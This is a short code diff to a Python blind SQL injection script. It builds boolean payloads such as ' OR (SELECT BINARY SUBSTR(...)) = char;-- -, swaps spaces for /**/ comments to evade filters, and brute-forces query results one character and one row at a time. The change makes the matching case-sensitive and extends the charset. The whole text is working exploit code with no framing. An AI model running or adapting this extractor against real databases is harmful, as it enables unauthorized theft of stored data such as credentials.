@@ -1,6 +1,6 @@
 def is_correct_char(index, char, base_query, row_offset):
     full_query = f"{base_query} LIMIT 1 OFFSET {row_offset}"
-    payload = f"' OR (SELECT SUBSTR(({full_query}), {index}, 1)) = '{char}';-- -"
+    payload = f"' OR (SELECT BINARY SUBSTR(({full_query}), {index}, 1)) = '{char}';-- -"
     # Replace space with /**/
     final_payload = payload.replace(" ", "/**/")
     try:
@@ -20,7 +20,7 @@ def dump_data(base_query):
         found_row = False
         for i in range(1, 100): 
             char_found = False
-            for char in "abcdefghijklmnopqrstuvwxyz0123456789_@-:":
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@-:":
                 if is_correct_char(i, char, base_query, row_offset):
                     extracted_string += char
                     print(extracted_string)
